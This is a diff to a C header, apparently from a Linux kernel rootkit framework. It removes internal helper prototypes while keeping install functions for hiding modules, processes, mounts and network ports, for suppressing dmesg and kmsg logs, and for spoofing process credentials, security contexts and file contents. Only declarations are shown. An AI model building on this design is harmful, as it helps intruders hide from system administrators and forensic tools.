@@ -67,12 +67,6 @@ typedef int (*neverc_krt_mod_seq_show_fn)(void *seq, void *v);
 NEVERC_KRT_RT_VAR neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
 NEVERC_KRT_RT_VAR const char *_neverc_krt_hide_target_name;
 
-int _neverc_krt_str_starts_with(const char *str, const char *prefix);
-
-
-int _neverc_krt_mod_seq_show_filter(void *seq, void *v);
-
-
 int neverc_krt_mod_proc_filter(struct neverc_krt_hide_state *state,
 			       const char *module_name);
 
@@ -84,7 +78,6 @@ NEVERC_KRT_RT_VAR int _neverc_krt_ks_hooked;
 NEVERC_KRT_RT_VAR unsigned long _neverc_krt_hide_mod_start;
 NEVERC_KRT_RT_VAR unsigned long _neverc_krt_hide_mod_end;
 
-int _neverc_krt_mod_text_addr_filter(unsigned long addr);
 
 
 int neverc_krt_mod_kallsyms_filter(struct neverc_krt_hide_state *state,
@@ -125,7 +118,6 @@ struct neverc_krt_pid_hide_state {
 
 NEVERC_KRT_RT_VAR struct neverc_krt_pid_hide_state _neverc_krt_pid_state;
 
-int _neverc_krt_atoi(const char *s, int len);
 
 
 int _neverc_krt_pid_is_hidden(int pid);
@@ -141,20 +133,6 @@ struct _neverc_krt_pid_actor_slot {
 NEVERC_KRT_RT_VAR struct _neverc_krt_pid_actor_slot
 	_neverc_krt_pid_actors[_NEVERC_KRT_PID_ACTOR_SLOTS];
 
-int _neverc_krt_pid_actor_acquire(neverc_krt_filldir_fn orig);
-
-
-void _neverc_krt_pid_actor_release(void);
-
-
-neverc_krt_filldir_fn _neverc_krt_pid_actor_get_orig(void);
-
-
-int _neverc_krt_pid_filldir_wrap(void *ctx, const char *name, int namlen,
-				 long long offset, u64 ino, unsigned int type);
-
-
-void _neverc_krt_pid_readdir_ctx(neverc_krt_reg_ctx *ctx);
 
 
 int neverc_krt_pid_hide_add(int pid);
@@ -197,10 +175,6 @@ int neverc_krt_mount_filter_add(const char *path);
 
 NEVERC_KRT_RT_VAR neverc_krt_mounts_show_fn _neverc_krt_orig_mounts_show_fn;
 
-int _neverc_krt_mnt_path_match(const char *haystack);
-
-
-int _neverc_krt_mounts_show_filter(void *seq, void *v);
 
 
 int neverc_krt_mount_filter_install(void);
@@ -258,10 +232,6 @@ struct _neverc_krt_vmap_area {
 	unsigned long va_end;
 };
 
-int _neverc_krt_vmalloc_show_filter(void *seq, void *v);
-
-
-void *_neverc_krt_resolve_vmalloc_s_show(void);
 
 
 int neverc_krt_mod_vmalloc_filter(void);
@@ -282,18 +252,8 @@ NEVERC_KRT_RT_VAR int _neverc_krt_dmesg_filter_cnt;
 int neverc_krt_dmesg_filter_add(const char *keyword);
 
 
-int _neverc_krt_str_contains(const char *haystack, const char *needle);
-
-
-int _neverc_krt_dmesg_should_suppress(const char *text);
-
-
-__attribute__((__noinline__)) long _neverc_krt_dmesg_ret0(void);
-
 
 NEVERC_KRT_RT_VAR int _neverc_krt_dmesg_fmt_reg;
-
-void _neverc_krt_dmesg_ctx_handler(neverc_krt_reg_ctx *ctx);
 
 
 int neverc_krt_dmesg_suppress_install(const char *module_name);
@@ -311,8 +271,6 @@ NEVERC_KRT_RT_VAR struct neverc_krt_hook _neverc_krt_kmsg_read_hook;
 NEVERC_KRT_RT_VAR neverc_krt_kmsg_read_fn _neverc_krt_orig_kmsg_read;
 NEVERC_KRT_RT_VAR int _neverc_krt_kmsg_read_hooked;
 
-long _neverc_krt_kmsg_read_filter(void *filp, char __user *buf,
-				  size_t count, long long *ppos);
 
 
 int neverc_krt_kmsg_read_filter_install(void);
@@ -334,7 +292,6 @@ NEVERC_KRT_RT_VAR u32 _neverc_krt_status_spoof_gid;
 typedef int (*neverc_krt_seq_printf_fn)(void *seq, const char *fmt, ...);
 NEVERC_KRT_RT_VAR neverc_krt_seq_printf_fn _neverc_krt_seq_printf_fn;
 
-void _neverc_krt_status_ctx_handler(neverc_krt_reg_ctx *ctx);
 
 
 int neverc_krt_proc_status_filter_install(u32 fake_uid, u32 fake_gid);
@@ -354,8 +311,6 @@ NEVERC_KRT_RT_VAR int _neverc_krt_proc_attr_hooked;
 
 NEVERC_KRT_RT_VAR const char *_neverc_krt_attr_fake_ctx;
 
-long _neverc_krt_proc_attr_read_filter(void *file, char __user *buf,
-					size_t count, long long *ppos);
 
 
 int neverc_krt_proc_attr_filter_install(const char *fake_context);
@@ -390,29 +345,9 @@ NEVERC_KRT_RT_VAR neverc_krt_net_seq_show_fn _neverc_krt_orig_udp6_show;
 int neverc_krt_net_hide_add_port(u16 port);
 
 
-int _neverc_krt_net_port_hidden(u16 port);
-
-
 #define _NEVERC_KRT_SKC_DPORT_OFF NEVERC_KRT_SKC_DPORT_OFF
 #define _NEVERC_KRT_SKC_NUM_OFF   NEVERC_KRT_SKC_NUM_OFF
 
-int _neverc_krt_extract_ports(void *sk, u16 *sport, u16 *dport);
-
-
-int _neverc_krt_net_filter_show(void *seq, void *v,
-				neverc_krt_net_seq_show_fn orig);
-
-
-int _neverc_krt_tcp4_show_filter(void *seq, void *v);
-
-
-int _neverc_krt_tcp6_show_filter(void *seq, void *v);
-
-
-int _neverc_krt_udp4_show_filter(void *seq, void *v);
-
-
-int _neverc_krt_udp6_show_filter(void *seq, void *v);
 
 
 int neverc_krt_net_hide_install(void);
@@ -439,8 +374,6 @@ NEVERC_KRT_RT_VAR int _neverc_krt_cmdline_filter_cnt;
 int neverc_krt_cmdline_filter_add(const char *keyword);
 
 
-long _neverc_krt_cmdline_read_filter(void *file, char __user *buf,
-				     size_t count, long long *ppos);
 
 
 int neverc_krt_cmdline_filter_install(void);
@@ -486,7 +419,6 @@ int neverc_krt_file_spoof_add(const char *path,
  */
 #define _NEVERC_KRT_DENTRY_DNAME_NAME_OFF NEVERC_KRT_DENTRY_DNAME_OFF
 
-int _neverc_krt_probe_file_dentry_off(void *file);
 
 NEVERC_KRT_RT_VAR int _neverc_krt_file_dentry_probed;
 
@@ -503,11 +435,6 @@ static __always_inline unsigned long _neverc_krt_get_file_dentry_off(void)
 	return _neverc_krt_file_dentry_off_for(kv);
 }
 
-int _neverc_krt_file_match_path(void *file, const char *target);
-
-
-long _neverc_krt_vfs_read_filter(void *file, char __user *buf,
-				 size_t count, long long *pos);
 
 
 int neverc_krt_file_spoof_install(void);
